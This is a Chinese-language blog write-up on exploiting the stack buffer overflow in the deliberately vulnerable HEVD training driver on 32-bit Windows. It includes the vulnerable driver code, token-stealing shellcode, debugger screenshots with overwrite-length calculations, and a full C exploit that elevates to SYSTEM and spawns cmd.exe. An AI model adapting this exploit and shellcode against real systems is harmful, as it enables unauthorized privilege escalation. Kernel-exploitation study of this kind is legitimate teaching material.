

+++

  author = "2st"
  title = "Windows Kernel Exploit 1-StackOverflow"
  date = "2020-06-15T23:36:17+08:00"
  description = "NULL"
  tags = [
      "kernel","exploit"

]
categories = [
    "Windows","pwn"
]
aliases = ["migrate-from-jekyl"]
favorite = true

+++

友好简单的Windows内核漏洞分析1

<!--more-->

### 0x1前置知识

StackOverflow：就是栈溢出的意思，是pwn的入门级知识，这里由于靶机的原因只展示x86下栈溢出的基本操作。

现在有：

```c
PVOID Dst[80];
PVOID UsrBuf[Size];
RtlCopyMemory(Dst,UsrBuf,Size);
```

而读入的时候，Size被攻击者所劫持，那么就造成了缓冲区溢出，以下图示：

![](http://23.91.100.118:8080/images/2020/06/15/a06bd3c02c5b332881ab241949cbeb15.png)

因为Size是可控制的，所以只要使填充的数据Size = sizeof(Buffer)+sizeof(Var0 + Var1 + ...) +sizeof(ebp)，之后写上构造的shellcode的地址，当这个函数结束返回它认为的'Caller'时，其实是返回到shellcode的位置。

整理一下，原驱动是这么写的：

```c
NTSTATUS
TriggerBufferOverflowStack(
    _In_ PVOID UserBuffer,
    _In_ SIZE_T Size
)
{
    NTSTATUS Status = STATUS_SUCCESS;
    ULONG KernelBuffer[BUFFER_SIZE] = { 0 };
    DbgPrint("[+] Defined: %X\n",BUFFER_SIZE);
    PAGED_CODE();
    __try
    {
        RtlCopyMemory((PVOID)KernelBuffer, UserBuffer, Size);
    }
    __except (EXCEPTION_EXECUTE_HANDLER)
    {
        Status = GetExceptionCode();
        DbgPrint("[-] Exception Code: 0x%X\n", Status);
    }

    return Status;
}
```

这么一看漏洞利用就十分简单了：

1. 准备好shellcode
2. 计算覆盖长度，覆盖返回地址为shellcode的地址
3. 成功在R3提权

### 0x2 一点点API

同理，第一篇文章已经介绍过了，逆向得出/看原驱动咋写的

1. 触发栈溢出的漏洞函数

```c
#define STACKOVERFLOW 0x222003
DeviceIoControl(hDevice, STACKOVERFLOW, buf, 0x824, NULL, 0, &bReturn, NULL);
```

2. 提权shllcode（还是替换token）

```c
VOID ShellCode()
{
	//__debugbreak();
	__asm
	{
		pop    edi
		pop    esi
		pop    ebx
		pushad
		mov eax, fs: [124h]
		mov eax, [eax + 050h]
		mov ecx, eax
		mov edx, 4

		find_sys_pid :
		mov eax, [eax + 0b8h]
		sub eax, 0b8h
		cmp[eax + 0b4h], edx
		jnz find_sys_pid

		mov edx, [eax + 0f8h]
		mov[ecx + 0f8h], edx
		popad
		pop ebp
		ret 8
	}
}
```

### 0x3 调试验证过程

断点：

> HEVD!TriggerBufferOverflowStack

跑exp前不说了，普通用户权限，跑起来命中断点：

![](http://23.91.100.118:8080/images/2020/06/15/5ead58e6d8497c12b6202b1452ebfcc7.png)

跑到RtlCopyMemory，先不执行，看一下此时的栈指针状态

![](http://23.91.100.118:8080/images/2020/06/15/b9e2cd7b08bdfdff3a3bab848bf7a37d.png)

计算一下需要覆盖的长度：0x820 = 0x95101ad0 - 0x951012b4 + 0x4，直接覆盖，可以看到ebp后面的返回地址被覆盖成了shellcode的地址，~~RtlCopyMemory的参数Size忘展示了，读者自行留意一下即可~~

![](http://23.91.100.118:8080/images/2020/06/15/b871d5331d1bda507ae3c8a1aa8a9e65.png)

成功在R3提权

### 0x4 留图纪念

![](http://23.91.100.118:8080/images/2020/06/15/c20d5f902fe232dc1f92b45152e333ed.png)

### 0x5 Tips

这个难度很低，有教程根据源码确定的KernelBuffer的大小，注意UserBuffer类型是PVOID，KernelBuffer的类型是ULONG，所以计算出来的是0x800 = 0x200 * 4，中间一些其他的变量占了0x20

### 0x6 Exp

```c
#include<stdio.h>
#include<windows.h>
#define STACKOVERFLOW 0x222003
/************************************************************************/
/*		        Stack Over flow                                 		*/
/*                 Write by Thunder_J 2019.6                            */
/************************************************************************/

VOID ShellCode()
{
	//__debugbreak();
	__asm
	{
		pop    edi
		pop    esi
		pop    ebx
		pushad
		mov eax, fs: [124h]
		mov eax, [eax + 050h]
		mov ecx, eax
		mov edx, 4

		find_sys_pid :
		mov eax, [eax + 0b8h]
		sub eax, 0b8h
		cmp[eax + 0b4h], edx
		jnz find_sys_pid

		mov edx, [eax + 0f8h]
		mov[ecx + 0f8h], edx
		popad
		pop ebp
		ret 8
	}
}

static VOID CreateCmd()
{
	STARTUPINFO si = { sizeof(si) };
	PROCESS_INFORMATION pi = { 0 };
	si.dwFlags = STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_SHOW;
	WCHAR wzFilePath[MAX_PATH] = { L"cmd.exe" };
	BOOL bReturn = CreateProcessW(NULL, wzFilePath, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, (LPSTARTUPINFOW)&si, &pi);
	if (bReturn) CloseHandle(pi.hThread), CloseHandle(pi.hProcess);
}

int main()
{
	char buf[0x824];
	HANDLE hDevice;
	DWORD bReturn = 0;
	
	hDevice = CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver",
		GENERIC_READ | GENERIC_WRITE,
		FILE_SHARE_READ | FILE_SHARE_WRITE,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED,
		NULL
	);

	printf("Start to get HANDLE...\n");
	if (hDevice == INVALID_HANDLE_VALUE || hDevice == NULL)
	{
		printf("Failed to get handle...!\n");
		return 0;
	}
	//__debugbreak();
	memset(buf, 'A', 0x824);
	*(PDWORD)(buf + 0x820) = (DWORD)&ShellCode;

	// call TriggerStackOverflow()
	printf("Started to over flow...\n");
	//__debugbreak();
	DeviceIoControl(hDevice, STACKOVERFLOW, buf, 0x824, NULL, 0, &bReturn, NULL);

	printf("Started to Create cmd...\n");
	CreateCmd();
	return 0;
}
```

